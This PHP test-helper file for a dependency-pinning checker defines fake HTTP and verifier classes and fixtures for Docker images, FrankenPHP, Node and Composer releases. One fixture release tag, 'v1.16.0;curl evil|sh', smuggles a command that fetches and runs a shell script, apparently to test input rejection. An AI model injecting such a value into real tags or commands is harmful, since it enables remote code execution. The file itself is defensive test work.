<?php

declare(strict_types=1);

/**
 * The upstreams deps:check reads, as fixtures: an Http answering from a
 * map of URLs and a Verifier answering from a list, so the suite never
 * reaches the network. A URL the map does not hold fails as a network that
 * is down would.
 */

namespace Tinvar\Tests\Deps;

use Tinvar\Deps\Context;
use Tinvar\Deps\DepsException;
use Tinvar\Deps\Http;
use Tinvar\Deps\PinnedFiles;
use Tinvar\Deps\Pins\FrankenPhpPin;
use Tinvar\Deps\Pins\NodePin;
use Tinvar\Deps\Response;
use Tinvar\Deps\Verifier;

final class FakeHttp implements Http
{
    /** @var array<string, array{string, array<string, string>}> */
    private array $routes = [];

    /** @var list<array{string, array<string, string>}> */
    public array $requests = [];

    /** @param array<string, string> $headers */
    public function on(string $url, string $body, array $headers = []): self
    {
        $this->routes[$url] = [$body, $headers];

        return $this;
    }

    /** @param array<mixed> $json */
    public function json(string $url, array $json): self
    {
        return $this->on($url, json_encode($json, JSON_THROW_ON_ERROR | JSON_UNESCAPED_SLASHES));
    }

    public function get(string $url, array $headers = [], int $limit = 8 << 20): Response
    {
        $this->requests[] = [$url, $headers];
        [$body, $responseHeaders] = $this->routes[$url] ?? throw new DepsException("offline: {$url}");
        if (\strlen($body) > $limit) {
            throw new DepsException("GET {$url} is larger than {$limit} bytes.");
        }

        return new Response(array_change_key_case($responseHeaders), $body);
    }

    public function download(string $url, string $path, int $limit, array $headers = []): void
    {
        file_put_contents($path, $this->get($url, $headers, $limit)->body);
    }

    /** @return list<string> */
    public function urls(): array
    {
        return array_column($this->requests, 0);
    }
}

final class FakeVerifier implements Verifier
{
    /** @var array<string, string> "repository workflow" by the sha256 attested */
    public array $attested = [];

    /** @var array<string, string> fingerprint by the sha256 of the data signed */
    public array $signed = [];

    public function attestation(string $file, string $sha256, string $repository, string $workflow): void
    {
        if (hash_file('sha256', $file) !== $sha256 || ($this->attested[$sha256] ?? null) !== "{$repository} {$workflow}") {
            throw new DepsException('No attestation from ' . $workflow . ' holds for ' . basename($file) . '.');
        }
    }

    /** @var array<string, string> "repository tag" by the sha256 of each asset in an immutable release */
    public array $released = [];

    public function releaseAsset(string $file, string $sha256, string $repository, string $tag): void
    {
        if (hash_file('sha256', $file) !== $sha256 || ($this->released[$sha256] ?? null) !== "{$repository} {$tag}") {
            throw new DepsException("{$repository} {$tag}'s release attestation does not name " . basename($file) . "'s sha256.");
        }
    }

    public function openPgp(string $data, string $signature, string $keyring): string
    {
        return $this->signed[(string) hash_file('sha256', $data)] ?? throw new DepsException('The signature on ' . basename($data) . ' does not hold.');
    }
}

const FIXTURES = __DIR__ . '/Fixtures/root';

/** The fixture checkout's pinned files. */
function files(): PinnedFiles
{
    return PinnedFiles::load(FIXTURES);
}

function context(FakeHttp $http, ?FakeVerifier $verifier = null): Context
{
    $work = sys_get_temp_dir() . '/tinvar-deps-test-' . bin2hex(random_bytes(6));
    mkdir($work, 0o700);
    register_shutdown_function(static fn () => discard($work));

    return new Context($http, $verifier ?? new FakeVerifier(), $work, 'test-token');
}

/** A copy of the fixture checkout to write into. */
function checkout(): string
{
    $root = sys_get_temp_dir() . '/tinvar-deps-checkout-' . bin2hex(random_bytes(6));
    $files = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator(FIXTURES, \FilesystemIterator::SKIP_DOTS));
    foreach ($files as $file) {
        if ($file instanceof \SplFileInfo && $file->isFile()) {
            $to = $root . substr($file->getPathname(), \strlen(FIXTURES));
            if (!is_dir(\dirname($to))) {
                mkdir(\dirname($to), 0o700, true);
            }
            copy($file->getPathname(), $to);
        }
    }

    return $root;
}

function discard(string $root): void
{
    $files = new \RecursiveIteratorIterator(
        new \RecursiveDirectoryIterator($root, \FilesystemIterator::SKIP_DOTS),
        \RecursiveIteratorIterator::CHILD_FIRST,
    );
    foreach ($files as $file) {
        if ($file instanceof \SplFileInfo) {
            $file->isDir() ? rmdir($file->getPathname()) : unlink($file->getPathname());
        }
    }
    rmdir($root);
}

/**
 * An official image on Docker Hub and its registry: Hub's tag listing, the
 * token, and $tag's index -- and, with $environment, its linux/amd64
 * manifest and config. Returns the index's digest.
 *
 * @param array<string, string|null> $listed other tags Hub lists, with their digests
 * @param array<string, string>|null $environment
 */
function image(FakeHttp $http, string $name, string $filter, string $tag, array $listed = [], ?array $environment = null, ?string $hubDigest = null, ?string $registryDigest = null): string
{
    $config = json_encode(['config' => ['Env' => array_map(static fn (string $k, string $v): string => "{$k}={$v}", array_keys($environment ?? []), $environment ?? [])]], JSON_THROW_ON_ERROR);
    $configDigest = 'sha256:' . hash('sha256', $config);
    $manifest = json_encode(['mediaType' => 'application/vnd.oci.image.manifest.v1+json', 'config' => ['digest' => $configDigest]], JSON_THROW_ON_ERROR);
    $manifestDigest = 'sha256:' . hash('sha256', $manifest);
    $index = json_encode([
        'mediaType' => 'application/vnd.oci.image.index.v1+json',
        'manifests' => [
            ['digest' => $manifestDigest, 'platform' => ['os' => 'linux', 'architecture' => 'amd64']],
            ['digest' => 'sha256:' . str_repeat('a', 64), 'platform' => ['os' => 'unknown', 'architecture' => 'unknown']],
            ['digest' => 'sha256:' . hash('sha256', "{$tag} arm64"), 'platform' => ['os' => 'linux', 'architecture' => 'arm64', 'variant' => 'v8']],
        ],
    ], JSON_THROW_ON_ERROR);
    $digest = 'sha256:' . hash('sha256', $index);

    $results = [];
    foreach ([...$listed, $tag => $hubDigest ?? $digest] as $name2 => $d) {
        $results[] = ['name' => (string) $name2, 'digest' => $d];
    }
    $http->json("https://hub.docker.com/v2/namespaces/library/repositories/{$name}/tags?name=" . rawurlencode($filter) . '&page_size=100', ['next' => null, 'results' => $results]);
    $http->json("https://auth.docker.io/token?service=registry.docker.io&scope=repository:library/{$name}:pull", ['token' => 'registry-token']);
    $http->on("https://registry-1.docker.io/v2/library/{$name}/manifests/{$tag}", $index, ['Docker-Content-Digest' => $registryDigest ?? $digest]);
    $http->on("https://registry-1.docker.io/v2/library/{$name}/manifests/{$manifestDigest}", $manifest);
    $http->on("https://registry-1.docker.io/v2/library/{$name}/blobs/{$configDigest}", $config);

    return $digest;
}

/**
 * A GitHub repository's releases, newest first as the API lists them.
 *
 * @param array<string, array<string, string>> $releases asset bytes by name, by tag
 * @param array<string, string> $extra raw release entries' tags to list as well, with no assets
 */
function releases(FakeHttp $http, string $repository, array $releases, array $extra = [], bool $digests = true): void
{
    $listing = [];
    foreach ($releases as $tag => $assets) {
        $entry = ['tag_name' => $tag, 'draft' => false, 'prerelease' => false, 'assets' => []];
        foreach ($assets as $name => $bytes) {
            $entry['assets'][] = ['name' => $name, 'digest' => $digests ? 'sha256:' . hash('sha256', $bytes) : null];
            $http->on("https://github.com/{$repository}/releases/download/{$tag}/{$name}", $bytes);
        }
        $listing[] = $entry;
    }
    foreach ($extra as $tag => $kind) {
        $listing[] = ['tag_name' => $tag, 'draft' => $kind === 'draft', 'prerelease' => $kind === 'prerelease', 'assets' => []];
    }
    $http->json("https://api.github.com/repos/{$repository}/releases?per_page=50", $listing);
}

/** A FrankenPHP binary as far as deps:check reads one: bytes with its banner in them. */
function frankenphp(string $version, string $php, string $arch): string
{
    return "\x7FELF{$arch}" . str_repeat("\0", 300) . "FrankenPHP v{$version} PHP {$php} Caddy v2.10.2\0" . str_repeat("\0", 300);
}

/** The newest release, with each binary's bytes, attested unless $attested is false. */
function frankenphpRelease(FakeHttp $http, FakeVerifier $verifier, string $version, string $php, bool $attested = true, bool $digests = true): array
{
    $assets = [];
    foreach (FrankenPhpPin::ASSETS as $arch => $asset) {
        $assets[$asset] = frankenphp($version, $php, $arch);
        if ($attested) {
            $verifier->attested[hash('sha256', $assets[$asset])] = FrankenPhpPin::REPOSITORY . ' ' . FrankenPhpPin::WORKFLOW;
        }
    }
    releases($http, FrankenPhpPin::REPOSITORY, ["v{$version}" => $assets, 'v1.13.3' => []], [
        'v1.14.0' => 'prerelease',
        'v1.15.0' => 'draft',
        'v1.16.0;curl evil|sh' => 'release',
        'v1.17.0-rc1' => 'release',
    ], $digests);

    return $assets;
}

/** Node's index and a release's signed sums and tarballs; returns the keyring's sha256. */
function nodeRelease(FakeHttp $http, FakeVerifier $verifier, string $version, bool $signed = true, ?string $tamper = null): string
{
    $http->json('https://nodejs.org/dist/index.json', [
        ['version' => 'v24.22.1', 'lts' => 'Krypton', 'files' => ['linux-x64', 'linux-arm64']],
        ['version' => 'v23.11.1', 'lts' => false, 'files' => ['linux-x64', 'linux-arm64']],
        ['version' => "v{$version}", 'lts' => 'Jod', 'files' => ['linux-x64', 'linux-arm64', 'win-x64-zip']],
        ['version' => 'v22.99.0', 'lts' => false, 'files' => ['linux-x64', 'linux-arm64']],
        ['version' => 'v22.23.4', 'lts' => 'Jod', 'files' => ['linux-x64', 'linux-arm64']],
    ]);
    $sums = '';
    foreach (NodePin::ARCHES as $platform) {
        $tarball = "node-v{$version}-{$platform}.tar.xz";
        $bytes = "tarball {$tarball}";
        $http->on("https://nodejs.org/dist/v{$version}/{$tarball}", $tamper === $platform ? 'tampered' : $bytes);
        $sums .= hash('sha256', $bytes) . "  {$tarball}\n";
    }
    $http->on("https://nodejs.org/dist/v{$version}/SHASUMS256.txt", $sums);
    $http->on("https://nodejs.org/dist/v{$version}/SHASUMS256.txt.sig", 'signature');
    $http->on('https://raw.githubusercontent.com/nodejs/release-keys/' . NodePin::KEYS_COMMIT . '/gpg-only-active-keys/pubring.kbx', 'keyring');
    if ($signed) {
        $verifier->signed[hash('sha256', $sums)] = str_repeat('5BE8', 10);
    }

    return hash('sha256', 'keyring');
}

/** Every upstream, with FrankenPHP and Composer behind, Composer's signature failing. */
function upstreams(): array
{
    $http = new FakeHttp();
    $verifier = new FakeVerifier();
    foreach ([['php', '-cli-trixie', '8.5.12-cli-trixie', ['PHP_VERSION' => '8.5.12']], ['debian', 'trixie-slim', 'trixie-slim', null]] as [$name, $filter, $tag, $env]) {
        image($http, $name, $filter, $tag, environment: $env);
    }
    $assets = [];
    foreach (FrankenPhpPin::ASSETS as $arch => $asset) {
        $assets[$asset] = frankenphp('1.13.4', '8.5.12', $arch);
        $verifier->attested[hash('sha256', $assets[$asset])] = FrankenPhpPin::REPOSITORY . ' ' . FrankenPhpPin::WORKFLOW;
    }
    releases($http, FrankenPhpPin::REPOSITORY, ['v1.13.4' => $assets]);
    $http->json('https://getcomposer.org/versions', ['stable' => [['version' => '2.10.4', 'min-php' => 70205]]])
        ->on('https://getcomposer.org/download/2.10.4/composer.phar', 'phar')
        ->on('https://getcomposer.org/download/2.10.4/composer.phar.sha256sum', hash('sha256', 'phar') . '  composer.phar')
        ->json('https://getcomposer.org/download/2.10.4/composer.phar.sig', ['sha384' => base64_encode('forged')]);

    return [$http, $verifier];
}
